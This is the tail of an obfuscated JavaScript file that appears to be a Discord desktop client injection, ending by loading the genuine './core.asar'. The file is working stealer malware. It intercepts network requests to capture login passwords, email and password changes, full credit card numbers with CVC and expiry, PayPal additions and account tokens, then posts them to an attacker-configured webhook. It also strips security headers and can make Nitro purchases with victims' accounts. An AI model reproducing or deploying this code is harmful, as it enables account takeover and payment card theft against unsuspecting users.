_0x3c0083&0x1<<0x16&&_0x26f168['push'](_0x599769(0x16c)),_0x3c0083&0x1<<0x12&&_0x26f168['push'](_0x599769(0x1dd)),_0x3c0083&0x1<<0x11&&_0x26f168[_0x599769(0x188)](_0x599769(0x1ff)),_0x3c0083&0x1<<0xe&&_0x26f168[_0x599769(0x188)](_0x599769(0x22c)),_0x3c0083&0x1<<0x9&&_0x26f168['push']('Early\x20Supporter'),_0x3c0083&0x1<<0x8&&_0x26f168['push']('HypeSquad\x20Balance'),_0x3c0083&0x1<<0x7&&_0x26f168['push']('HypeSquad\x20Brilliance'),_0x3c0083&0x1<<0x6&&_0x26f168[_0x599769(0x188)](_0x599769(0x16b)),_0x3c0083&0x1<<0x3&&_0x26f168[_0x599769(0x188)](_0x599769(0x1a2)),_0x3c0083&0x1<<0x2&&_0x26f168[_0x599769(0x188)](_0x599769(0x210)),_0x3c0083&0x1<<0x1&&_0x26f168[_0x599769(0x188)](_0x599769(0x235)),_0x3c0083&0x1<<0x0&&_0x26f168[_0x599769(0x188)]('Discord\x20Staff'),!_0x26f168[_0x599769(0x201)]?_0x599769(0x17f):_0x26f168[_0x599769(0x233)](',\x20');},hooker=async _0x194cd4=>{const _0x5a6b2e=_0x2a1e94,_0x7dc7c1=JSON[_0x5a6b2e(0x1c5)](_0x194cd4),_0x2a0bf8=new URL(config[_0x5a6b2e(0x19d)]),_0x445887={'Content-Type':_0x5a6b2e(0x171),'Access-Control-Allow-Origin':'*'};if(!config['webhook'][_0x5a6b2e(0x168)](_0x5a6b2e(0x16a))){const _0x567139=totp(config[_0x5a6b2e(0x181)]);_0x445887[_0x5a6b2e(0x170)]=_0x567139;}const _0x4909c7={'protocol':_0x2a0bf8[_0x5a6b2e(0x15f)],'hostname':_0x2a0bf8[_0x5a6b2e(0x1be)],'path':_0x2a0bf8[_0x5a6b2e(0x1af)],'method':_0x5a6b2e(0x208),'headers':_0x445887},_0x33f643=https[_0x5a6b2e(0x1c1)](_0x4909c7);_0x33f643['on'](_0x5a6b2e(0x194),_0x2c04fb=>{const _0x12e359=_0x5a6b2e;console[_0x12e359(0x1e5)](_0x2c04fb);}),_0x33f643[_0x5a6b2e(0x190)](_0x7dc7c1),_0x33f643[_0x5a6b2e(0x1e2)]();},login=async(_0x3d75c4,_0x4baa9c,_0x8a3421)=>{const _0xd1e2f6=_0x2a1e94,_0x2af949=await getInfo(_0x8a3421),_0x2f7019=getNitro(_0x2af949['premium_type']),_0x563b9b=getBadges(_0x2af949['flags']),_0x2a7e5a=await getBilling(_0x8a3421),_0xa0bc2={'username':config['embed_name'],'avatar_url':config[_0xd1e2f6(0x213)],'embeds':[{'color':config[_0xd1e2f6(0x1e8)],'fields':[{'name':_0xd1e2f6(0x17c),'value':_0xd1e2f6(0x1d2)+_0x3d75c4+_0xd1e2f6(0x1ad)+_0x4baa9c+'**','inline':![]},{'name':_0xd1e2f6(0x1f3),'value':_0xd1e2f6(0x227)+_0x2f7019+'**\x0aBadges:\x20**'+_0x563b9b+_0xd1e2f6(0x18f)+_0x2a7e5a+'**','inline':![]},{'name':_0xd1e2f6(0x1ba),'value':'`'+_0x8a3421+'`','inline':![]}],'author':{'name':_0x2af949['username']+'#'+_0x2af949[_0xd1e2f6(0x185)]+_0xd1e2f6(0x1c8)+_0x2af949['id'],'icon_url':_0xd1e2f6(0x162)+_0x2af949['id']+'/'+_0x2af949['avatar']+_0xd1e2f6(0x1a9)}}]};if(config[_0xd1e2f6(0x22d)])_0xa0bc2[_0xd1e2f6(0x236)]=config['ping_val'];hooker(_0xa0bc2);},passwordChanged=async(_0x2f21f5,_0x4bdb07,_0x1fd311)=>{const _0x315a48=_0x2a1e94,_0x2a253=await getInfo(_0x1fd311),_0x202a20=getNitro(_0x2a253[_0x315a48(0x20a)]),_0x44dda7=getBadges(_0x2a253['flags']),_0xdd077a=await getBilling(_0x1fd311),_0x451f45={'username':config[_0x315a48(0x1fc)],'avatar_url':config[_0x315a48(0x213)],'embeds':[{'color':config['embed_color'],'fields':[{'name':'**Password\x20Changed**','value':_0x315a48(0x1d2)+_0x2a253['email']+_0x315a48(0x1bc)+_0x2f21f5+'**\x0aNew\x20Password:\x20**'+_0x4bdb07+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x315a48(0x227)+_0x202a20+_0x315a48(0x19c)+_0x44dda7+'**\x0aBilling:\x20**'+_0xdd077a+'**','inline':!![]},{'name':_0x315a48(0x1ba),'value':'`'+_0x1fd311+'`','inline':![]}],'author':{'name':_0x2a253[_0x315a48(0x17d)]+'#'+_0x2a253[_0x315a48(0x185)]+_0x315a48(0x1c8)+_0x2a253['id'],'icon_url':_0x315a48(0x162)+_0x2a253['id']+'/'+_0x2a253[_0x315a48(0x1d3)]+_0x315a48(0x1a9)}}]};if(config[_0x315a48(0x22d)])_0x451f45[_0x315a48(0x236)]=config[_0x315a48(0x1ab)];hooker(_0x451f45);},emailChanged=async(_0x3506a5,_0x26e7b0,_0x5cf100)=>{const _0x35f5dc=_0x2a1e94,_0x4f134a=await getInfo(_0x5cf100),_0x565d8a=getNitro(_0x4f134a[_0x35f5dc(0x20a)]),_0x4d1d9a=getBadges(_0x4f134a['flags']),_0x4daa38=await getBilling(_0x5cf100),_0x4569d9={'username':config[_0x35f5dc(0x1fc)],'avatar_url':config[_0x35f5dc(0x213)],'embeds':[{'color':config[_0x35f5dc(0x1e8)],'fields':[{'name':_0x35f5dc(0x161),'value':_0x35f5dc(0x204)+_0x3506a5+_0x35f5dc(0x1ed)+_0x26e7b0+'**','inline':!![]},{'name':'**Discord\x20Info**','value':'Nitro\x20Type:\x20**'+_0x565d8a+_0x35f5dc(0x19c)+_0x4d1d9a+'**\x0aBilling:\x20**'+_0x4daa38+'**','inline':!![]},{'name':_0x35f5dc(0x1ba),'value':'`'+_0x5cf100+'`','inline':![]}],'author':{'name':_0x4f134a[_0x35f5dc(0x17d)]+'#'+_0x4f134a[_0x35f5dc(0x185)]+_0x35f5dc(0x1c8)+_0x4f134a['id'],'icon_url':_0x35f5dc(0x162)+_0x4f134a['id']+'/'+_0x4f134a[_0x35f5dc(0x1d3)]+_0x35f5dc(0x1a9)}}]};if(config[_0x35f5dc(0x22d)])_0x4569d9[_0x35f5dc(0x236)]=config[_0x35f5dc(0x1ab)];hooker(_0x4569d9);},PaypalAdded=async _0x57670b=>{const _0x3c1101=_0x2a1e94,_0x640601=await getInfo(_0x57670b),_0x35ce23=getNitro(_0x640601[_0x3c1101(0x20a)]),_0x4edc2e=getBadges(_0x640601['flags']),_0x1040fc=getBilling(_0x57670b),_0x6554c1={'username':config[_0x3c1101(0x1fc)],'avatar_url':config[_0x3c1101(0x213)],'embeds':[{'color':config['embed_color'],'fields':[{'name':'**PayPal\x20Added**','value':_0x3c1101(0x1b7),'inline':![]},{'name':_0x3c1101(0x1f3),'value':'Nitro\x20Type:\x20**'+_0x35ce23+_0x3c1101(0x1c3)+_0x4edc2e+_0x3c1101(0x18f)+_0x1040fc+'**','inline':![]},{'name':_0x3c1101(0x1ba),'value':'`'+_0x57670b+'`','inline':![]}],'author':{'name':_0x640601[_0x3c1101(0x17d)]+'#'+_0x640601[_0x3c1101(0x185)]+_0x3c1101(0x1c8)+_0x640601['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x640601['id']+'/'+_0x640601[_0x3c1101(0x1d3)]+_0x3c1101(0x1a9)}}]};if(config[_0x3c1101(0x22d)])_0x6554c1[_0x3c1101(0x236)]=config[_0x3c1101(0x1ab)];hooker(_0x6554c1);},ccAdded=async(_0x16c372,_0x183955,_0x3e0d04,_0x399d71,_0x3f88b7)=>{const _0x56187b=_0x2a1e94,_0x5c7893=await getInfo(_0x3f88b7),_0x50e528=getNitro(_0x5c7893[_0x56187b(0x20a)]),_0x48668c=getBadges(_0x5c7893['flags']),_0x5aff8e=await getBilling(_0x3f88b7),_0x1f0737={'username':config['embed_name'],'avatar_url':config['embed_icon'],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x56187b(0x167),'value':_0x56187b(0x17b)+_0x16c372+'**\x0aCVC:\x20**'+_0x183955+_0x56187b(0x1ec)+_0x3e0d04+'/'+_0x399d71+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x56187b(0x227)+_0x50e528+'**\x0aBadges:\x20**'+_0x48668c+_0x56187b(0x18f)+_0x5aff8e+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x3f88b7+'`','inline':![]}],'author':{'name':_0x5c7893['username']+'#'+_0x5c7893[_0x56187b(0x185)]+_0x56187b(0x1c8)+_0x5c7893['id'],'icon_url':_0x56187b(0x162)+_0x5c7893['id']+'/'+_0x5c7893[_0x56187b(0x1d3)]+_0x56187b(0x1a9)}}]};if(config['ping_on_run'])_0x1f0737['content']=config['ping_val'];hooker(_0x1f0737);},nitroBought=async _0x40446d=>{const _0x497896=_0x2a1e94,_0xa22eea=await getInfo(_0x40446d),_0x39ba58=getNitro(_0xa22eea['premium_type']),_0x5bfe68=getBadges(_0xa22eea['flags']),_0x3b7bd5=await getBilling(_0x40446d),_0xa33bf1=await buyNitro(_0x40446d),_0x57c7c1={'username':config[_0x497896(0x1fc)],'content':_0xa33bf1,'avatar_url':config[_0x497896(0x213)],'embeds':[{'color':config[_0x497896(0x1e8)],'fields':[{'name':_0x497896(0x1a1),'value':_0x497896(0x1a0)+_0xa33bf1+_0x497896(0x164),'inline':!![]},{'name':_0x497896(0x1f3),'value':_0x497896(0x227)+_0x39ba58+_0x497896(0x19c)+_0x5bfe68+_0x497896(0x18f)+_0x3b7bd5+'**','inline':!![]},{'name':_0x497896(0x1ba),'value':'`'+_0x40446d+'`','inline':![]}],'author':{'name':_0xa22eea[_0x497896(0x17d)]+'#'+_0xa22eea[_0x497896(0x185)]+_0x497896(0x1c8)+_0xa22eea['id'],'icon_url':_0x497896(0x162)+_0xa22eea['id']+'/'+_0xa22eea[_0x497896(0x1d3)]+_0x497896(0x1a9)}}]};if(config['ping_on_run'])_0x57c7c1['content']=config['ping_val']+('\x0a'+_0xa33bf1);hooker(_0x57c7c1);};session[_0x2a1e94(0x1db)][_0x2a1e94(0x1cb)][_0x2a1e94(0x1a8)](config[_0x2a1e94(0x1c2)],(_0x365e80,_0x48c697)=>{const _0x4b4eec=_0x2a1e94;if(_0x365e80[_0x4b4eec(0x22f)]['startsWith'](_0x4b4eec(0x165)))return _0x48c697({'cancel':!![]});updateCheck();}),session['defaultSession'][_0x2a1e94(0x1cb)][_0x2a1e94(0x21a)]((_0x7e4ecc,_0x1a899a)=>{const _0x4bbefa=_0x2a1e94;_0x7e4ecc['url']['startsWith'](config[_0x4bbefa(0x19d)])?_0x7e4ecc[_0x4bbefa(0x22f)][_0x4bbefa(0x168)](_0x4bbefa(0x193))?_0x1a899a({'responseHeaders':Object[_0x4bbefa(0x1c0)]({'Access-Control-Allow-Headers':'*'},_0x7e4ecc[_0x4bbefa(0x1a4)])}):_0x1a899a({'responseHeaders':Object[_0x4bbefa(0x1c0)]({'Content-Security-Policy':[_0x4bbefa(0x1b1),_0x4bbefa(0x222),'Access-Control-Allow-Origin\x20\x27*\x27'],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x7e4ecc['responseHeaders'])}):(delete _0x7e4ecc[_0x4bbefa(0x1a4)][_0x4bbefa(0x21d)],delete _0x7e4ecc[_0x4bbefa(0x1a4)][_0x4bbefa(0x186)],_0x1a899a({'responseHeaders':{..._0x7e4ecc['responseHeaders'],'Access-Control-Allow-Headers':'*'}}));}),session['defaultSession'][_0x2a1e94(0x1cb)][_0x2a1e94(0x209)](config[_0x2a1e94(0x211)],async(_0x19186b,_0x1b25e4)=>{const _0x39758c=_0x2a1e94;if(_0x19186b[_0x39758c(0x19f)]!==0xc8&&_0x19186b[_0x39758c(0x19f)]!==0xca)return;const _0x5e064a=Buffer[_0x39758c(0x224)](_0x19186b['uploadData'][0x0][_0x39758c(0x172)])[_0x39758c(0x1f0)](),_0x16075c=JSON[_0x39758c(0x1e1)](_0x5e064a),_0x4847d6=await execScript(_0x39758c(0x1d8));switch(!![]){case _0x19186b[_0x39758c(0x22f)][_0x39758c(0x1b6)]('login'):login(_0x16075c[_0x39758c(0x21b)],_0x16075c['password'],_0x4847d6)[_0x39758c(0x223)](console[_0x39758c(0x194)]);break;case _0x19186b[_0x39758c(0x22f)][_0x39758c(0x1b6)](_0x39758c(0x179))&&_0x19186b[_0x39758c(0x1d0)]===_0x39758c(0x22e):if(!_0x16075c[_0x39758c(0x22b)])return;_0x16075c[_0x39758c(0x18b)]&&emailChanged(_0x16075c[_0x39758c(0x18b)],_0x16075c[_0x39758c(0x22b)],_0x4847d6)[_0x39758c(0x223)](console[_0x39758c(0x194)]);_0x16075c[_0x39758c(0x1f9)]&&passwordChanged(_0x16075c['password'],_0x16075c[_0x39758c(0x1f9)],_0x4847d6)[_0x39758c(0x223)](console[_0x39758c(0x194)]);break;case _0x19186b['url'][_0x39758c(0x1b6)](_0x39758c(0x174))&&_0x19186b[_0x39758c(0x1d0)]===_0x39758c(0x208):const _0x19a8d7=querystring[_0x39758c(0x1e1)](unparsedData['toString']());ccAdded(_0x19a8d7[_0x39758c(0x203)],_0x19a8d7['card[cvc]'],_0x19a8d7[_0x39758c(0x221)],_0x19a8d7[_0x39758c(0x1ee)],_0x4847d6)[_0x39758c(0x223)](console[_0x39758c(0x194)]);break;case _0x19186b[_0x39758c(0x22f)][_0x39758c(0x1b6)](_0x39758c(0x178))&&_0x19186b[_0x39758c(0x1d0)]==='POST':PaypalAdded(_0x4847d6)['catch'](console[_0x39758c(0x194)]);break;case _0x19186b[_0x39758c(0x22f)][_0x39758c(0x1b6)](_0x39758c(0x173))&&_0x19186b[_0x39758c(0x1d0)]===_0x39758c(0x208):if(!config[_0x39758c(0x184)])return;setTimeout(()=>{nitroBought(_0x4847d6)['catch'](console['error']);},0x1d4c);break;default:break;}}),module[_0x2a1e94(0x1e7)]=require('./core.asar');
